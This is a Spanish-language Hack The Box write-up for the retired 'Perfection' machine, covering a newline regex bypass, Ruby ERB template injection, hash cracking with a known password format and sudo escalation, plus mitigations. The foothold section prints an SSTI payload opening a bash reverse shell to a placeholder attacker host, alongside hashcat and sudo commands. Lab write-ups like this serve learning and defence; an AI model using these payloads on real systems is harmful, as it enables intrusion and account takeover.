---
machine: Perfection
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, ruby, sinatra, ssti, hashcat, privesc]
---

# Perfection — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La calculadora de notas filtra los campos con una regex, pero un salto de línea permite inyectar una expresión ERB en el nombre de categoría. La SSTI de Ruby ejecuta comandos y da shell como `susan`. En el sistema hay una base SQLite con hashes y un correo que describe el formato de contraseña; una máscara de Hashcat la crackea y `susan` puede ejecutar cualquier comando como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` nginx con una calculadora de notas ponderadas.
- La aplicación está escrita en Ruby/Sinatra y usa ERB.
- `feroxbuster` encuentra `/weighted-grade` y `/weighted-grade-calc`.

## Enumeración

- El código valida categorías con `^[a-zA-Z0-9/ ]+$` y notas/pesos con `^\d{1,2}$`.
- La validación se hace con `=~` sin `\A`/`\z`, así que un salto de línea al final permite añadir contenido.
- La categoría se interpola en una plantilla ERB creada en el propio handler.

## Foothold

Se envía una categoría válida seguida de `%0a` y una expresión ERB. El servidor la evalúa y ejecuta el comando.

```text
category1=Test%0a<%= system("bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'") %>
```

La shell corre como `susan`.

## Movimiento lateral

En `/home/susan` hay `pupilpath_credentials.db`, una base SQLite con cinco usuarios y hashes SHA-256. Un correo en la aplicación describe el formato de contraseña: `susan_nasus_` seguido de nueve dígitos.

```bash
sqlite3 pupilpath_credentials.db 'select * from users;'
```

## Escalada de privilegios

Se genera una máscara de Hashcat para el formato y se crackea el hash de `susan`. La contraseña también funciona para `sudo`, que permite cualquier comando como root.

```bash
hashcat susan.hash -m 1400 -a 3 'susan_nasus_?d?d?d?d?d?d?d?d?d'
sudo -i
```

## Evidencia

- Regex sin anclas y salto de línea.
- SSTI ERB en la categoría.
- Base SQLite con hashes SHA-256.
- Correo con el formato de contraseña.
- Máscara de Hashcat y root.

## Lecciones aprendidas

- Una regex de validación sin `\A`/`\z` se puede saltar con un salto de línea.
- Interpolar entrada en una plantilla ERB es ejecución de código.
- Un formato de contraseña conocido reduce el espacio de búsqueda a una máscara.
- Reutilizar la contraseña para `sudo` convierte una shell de usuario en root.

## Mitigación y detección

- Validar con `\A...\z` y listas blancas; no construir plantillas con entrada.
- Usar `ERB.new` solo con plantillas de confianza y escapar los valores.
- Aplicar políticas de contraseñas y no reutilizar credenciales.
- Limitar las reglas de sudo y auditar los comandos permitidos.

## Referencias

- [0xdf — Perfection](https://0xdf.gitlab.io/2024/07/06/htb-perfection.html)
- [IppSec — Perfection](https://www.youtube.com/watch?v=zcVCLoMsOKA)
- [Hack The Box — Perfection](https://app.hackthebox.com/machines/perfection)
